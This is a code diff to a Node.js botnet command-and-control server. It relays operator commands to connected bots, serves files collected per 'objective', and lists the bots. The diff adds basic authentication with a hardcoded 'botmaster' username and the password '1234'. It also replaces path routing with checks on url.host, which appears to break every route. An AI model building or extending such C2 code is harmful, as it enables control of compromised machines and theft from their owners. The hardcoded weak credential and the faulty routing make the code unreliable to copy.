@@ -1,6 +1,6 @@
 const http = require('http');
 const WebSocket = require('ws');
-
+const auth = require('basic-auth');
 const { save_file } = require ('./results_handlers')
 const { setup } = require ('./setup.js')
 const fs = require("fs");
@@ -9,11 +9,30 @@ const port = 3000;
 let clients = {};
 let botmasters = {};
 
+// Credentials of the botmaster
+const botmasterUser = 'botmaster';
+const botmasterPass = '1234';
+
+const authenticate = (req, res) => {
+    const credentials = auth(req);
+    if (!credentials || credentials.name !== botmasterUser || credentials.pass !== botmasterPass) {
+        res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="Access Denied"' });
+        res.end('Access denied');
+        return false;
+    }
+    return true;
+};
+
 
 const server = http.createServer((req, res) => {
     const url = new URL(req.url, `http://${req.headers.host}`);
 
-    if (req.method === 'POST' && url.pathname === '/send-command') {
+    if (!authenticate(req, res))
+        return;
+    
+
+    if (req.method === 'POST' && url.host === 'send-command') {
+
         let body = '';
         req.on('data', chunk => {
             body += chunk.toString();
@@ -31,7 +50,7 @@ const server = http.createServer((req, res) => {
             res.writeHead(200, { 'Content-Type': 'application/json' });
             res.end(JSON.stringify({ status: 'Command received and pushed to clients' }));
         });
-    } else if (req.method === 'GET' && url.pathname === '/download') {
+    } else if (req.method === 'GET' && url.host === 'download') {
 
         const objective = url.searchParams.get('objective');
         const file_name = url.searchParams.get('filename');
@@ -58,8 +77,7 @@ const server = http.createServer((req, res) => {
             res.end(JSON.stringify({ error: 'File not found' }));
         }
 
-    } else if (req.method === 'GET' && url.pathname === '/bots') {
-
+    } else if (req.method === 'GET' && url.host === 'bots') {
         res.writeHead(200, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({ bots: Object.keys(clients) }));
 
